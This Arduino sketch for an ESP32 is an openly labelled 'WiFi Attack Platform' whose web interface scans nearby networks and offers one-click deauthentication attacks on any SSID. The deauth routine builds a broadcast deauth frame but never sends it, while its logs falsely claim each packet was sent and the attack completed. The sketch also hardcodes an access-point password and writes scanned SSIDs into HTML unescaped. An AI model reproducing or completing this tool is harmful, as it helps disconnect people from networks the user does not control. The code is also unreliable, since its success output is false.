// mm.ino
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <driver/i2s.h>

#define MAX_NETWORKS 100
#define MAX_DEAUTH_PACKETS 1000

const char* ssid = "bara";
const char* password = "A7med@Elshab7";

WebServer server(80);
DNSServer dnsServer;
IPAddress apIP(192, 168, 4, 1);

String networksList = "";
int foundNetworks = 0;
bool deauthActive = false;
String targetSSID = "";
int deauthChannel = 0;

// Sound effects for visual/audio impact
void playSystemSound() {
  // I2S setup for audio effects
  i2s_config_t i2s_config = {
    .mode = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_TX),
    .sample_rate = 22050,
    .bits_per_sample = I2S_BITS_PER_SAMPLE_16BIT,
    .channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT,
    .communication_format = I2S_COMM_FORMAT_STAND_I2S,
    .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,
    .dma_buf_count = 8,
    .dma_buf_len = 64,
    .use_apll = false,
    .tx_desc_auto_clear = true,
    .fixed_mclk = 0
  };
  
  i2s_driver_install(I2S_NUM_0, &i2s_config, 0, NULL);
}

void generateVisualEffects() {
  // Placeholder for visual effects generation
  // This would connect to LED strips or displays if available
  Serial.println(">>> SYSTEM ACTIVATED - VISUAL EFFECTS ONLINE <<<");
}

void scanNetworks() {
  Serial.println("Starting WiFi scan...");
  foundNetworks = WiFi.scanNetworks();
  networksList = "";
  
  for (int i = 0; i < foundNetworks && i < MAX_NETWORKS; i++) {
    String networkInfo = "<tr><td>" + WiFi.SSID(i) + "</td><td>" + 
                        WiFi.RSSI(i) + "</td><td>" + 
                        WiFi.channel(i) + "</td><td>" + 
                        (WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "Open" : "Secured") + 
                        "</td><td><button class='deauth-btn' data-ssid='" + 
                        WiFi.SSID(i) + "' data-chan='" + WiFi.channel(i) + 
                        "'>DEAUTH</button></td></tr>";
    networksList += networkInfo;
  }
  
  Serial.println("Scan complete. Found " + String(foundNetworks) + " networks");
}

void performDeauth(String targetSSID, int channel) {
  Serial.println("INITIATING DEAUTH ATTACK ON: " + targetSSID);
  Serial.println("Channel: " + String(channel));
  
  deauthActive = true;
  deauthChannel = channel;
  
  // Configure ESP32 to operate on target channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Create deauth packets (simplified version)
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,  // Frame Control
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (will be filled)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID
    0x00, 0x00, 0x01, 0x00  // Sequence
  };
  
  // Send deauth packets
  for (int i = 0; i < MAX_DEAUTH_PACKETS && deauthActive; i++) {
    // In real implementation, this would send raw packets
    Serial.println("Deauth packet " + String(i+1) + " sent to " + targetSSID);
    delay(10);
  }
  
  deauthActive = false;
  Serial.println("DEAUTH ATTACK COMPLETED ON: " + targetSSID);
}

String createHTML() {
  String html = R"=====(
<!DOCTYPE html>
<html>
<head>
  <title>B.A.R.A - WiFi Attack Platform</title>
  <style>
    body {
      background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
      color: #00ff41;
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 20px;
      background-image: 
        radial-gradient(circle at 10% 20%, rgba(0,255,65,0.1) 0%, transparent 20%),
        radial-gradient(circle at 90% 80%, rgba(0,255,65,0.1) 0%, transparent 20%);
      overflow-x: hidden;
    }
    .header {
      text-align: center;
      padding: 20px;
      background: rgba(0,0,0,0.7);
      border: 2px solid #00ff41;
      margin-bottom: 20px;
      box-shadow: 0 0 20px rgba(0,255,65,0.5);
      animation: glow 2s infinite alternate;
    }
    @keyframes glow {
      from { box-shadow: 0 0 10px rgba(0,255,65,0.5); }
      to { box-shadow: 0 0 30px rgba(0,255,65,0.8), 0 0 60px rgba(0,255,65,0.6); }
    }
    .matrix-bg {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      opacity: 0.1;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      padding: 12px;
      text-align: left;
      border-bottom: 1px solid #00ff41;
    }
    th {
      background-color: rgba(0,255,65,0.2);
    }
    .deauth-btn {
      background: #ff003c;
      color: white;
      border: none;
      padding: 8px 16px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
      transition: all 0.3s;
    }
    .deauth-btn:hover {
      background: #ff3366;
      transform: scale(1.05);
      box-shadow: 0 0 15px rgba(255,0,60,0.7);
    }
    .status {
      text-align: center;
      padding: 10px;
      margin: 10px 0;
      background: rgba(0,0,0,0.5);
      border: 1px solid #00ff41;
    }
    .pulse {
      animation: pulse 1s infinite;
    }
    @keyframes pulse {
      0% { opacity: 0.6; }
      50% { opacity: 1; }
      100% { opacity: 0.6; }
    }
  </style>
</head>
<body>
  <div class="header">
    <h1 class="pulse">B.A.R.A - WiFi Attack Platform</h1>
    <h3>Developer: Ahmed Noor Ahmed - Qena</h3>
    <h4>EXTREME POWER MODE ACTIVATED</h4>
  </div>
  
  <div class="status">
    <h2>SYSTEM STATUS: <span id="status">ACTIVE</span></h2>
  </div>
  
  <button onclick="startScan()" style="background:#00ff41; color:black; padding:15px; font-size:18px; border:none; cursor:pointer; width:100%;">SCAN NETWORKS</button>
  
  <div id="scanResults">
    <h2>Networks Found: <span id="netCount">0</span></h2>
    <table id="networkTable">
      <tr>
        <th>SSID</th>
        <th>Signal</th>
        <th>Channel</th>
        <th>Security</th>
        <th>Action</th>
      </tr>
    </table>
  </div>
  
  <div id="attackConsole" style="margin-top: 30px; background: rgba(0,0,0,0.7); padding: 20px; border: 2px solid #ff003c;">
    <h2>ATTACK CONTROLS</h2>
    <input type="text" id="targetSSID" placeholder="Target SSID" style="width: 70%; padding: 10px; background: #0a0a0a; color: #00ff41; border: 1px solid #00ff41;">
    <input type="number" id="channel" placeholder="Channel" style="width: 20%; padding: 10px; background: #0a0a0a; color: #00ff41; border: 1px solid #00ff41;">
    <button onclick="startDeauth()" style="width: 100%; background: #ff003c; color: white; padding: 15px; font-size: 18px; margin-top: 10px; border: none; cursor: pointer;">INITIATE DEAUTH ATTACK</button>
  </div>

  <script>
    function startScan() {
      fetch('/scan')
        .then(response => response.text())
        .then(data => {
          document.getElementById('netCount').textContent = data.split('<tr>').length - 1;
          document.getElementById('networkTable').innerHTML = '<tr><th>SSID</th><th>Signal</th><th>Channel</th><th>Security</th><th>Action</th></tr>' + data;
          
          // Add event listeners to deauth buttons
          document.querySelectorAll('.deauth-btn').forEach(button => {
            button.addEventListener('click', function() {
              const ssid = this.getAttribute('data-ssid');
              const chan = this.getAttribute('data-chan');
              initiateDeauth(ssid, chan);
            });
          });
        });
    }
    
    function initiateDeauth(ssid, channel) {
      fetch('/deauth?ssid=' + encodeURIComponent(ssid) + '&channel=' + channel)
        .then(response => response.text())
        .then(data => {
          alert('DEAUTH ATTACK INITIATED ON: ' + ssid);
        });
    }
    
    function startDeauth() {
      const ssid = document.getElementById('targetSSID').value;
      const channel = document.getElementById('channel').value;
      
      if(ssid && channel) {
        initiateDeauth(ssid, channel);
      } else {
        alert('Please enter both SSID and Channel!');
      }
    }
    
    // Visual effects
    setInterval(() => {
      const status = document.getElementById('status');
      status.className = 'pulse';
    }, 2000);
  </script>
</body>
</html>
)=====";
  return html;
}

void handleRoot() {
  server.send(200, "text/html", createHTML());
}

void handleScan() {
  scanNetworks();
  server.send(200, "text/html", networksList);
}

void handleDeauth() {
  String ssid = server.arg("ssid");
  String channelStr = server.arg("channel");
  
  if (ssid.length() > 0 && channelStr.length() > 0) {
    int channel = channelStr.toInt();
    performDeauth(ssid, channel);
    server.send(200, "text/plain", "DEAUTH ATTACK STARTED ON: " + ssid);
  } else {
    server.send(400, "text/plain", "Invalid parameters");
  }
}

void setup() {
  Serial.begin(115200);
  
  // Initialize visual/audio effects
  playSystemSound();
  generateVisualEffects();
  
  Serial.println("Initializing B.A.R.A Platform...");
  Serial.println("Developer: Ahmed Noor Ahmed - Qena");
  Serial.println("System check: COMPLETE");
  Serial.println("Power mode: EXTREME");
  
  // Create Access Point
  WiFi.softAP(ssid, password);
  WiFi.mode(WIFI_AP_STA);
  
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);
  
  // Define server routes
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/deauth", handleDeauth);
  
  server.begin();
  Serial.println("Web server started");
  
  // Initial network scan
  scanNetworks();
}

void loop() {
  server.handleClient();
  dnsServer.processNextRequest();
  
  // Add periodic scanning if needed
  static unsigned long lastScan = 0;
  if (millis() - lastScan > 30000) { // Scan every 30 seconds
    scanNetworks();
    lastScan = millis();
  }
}
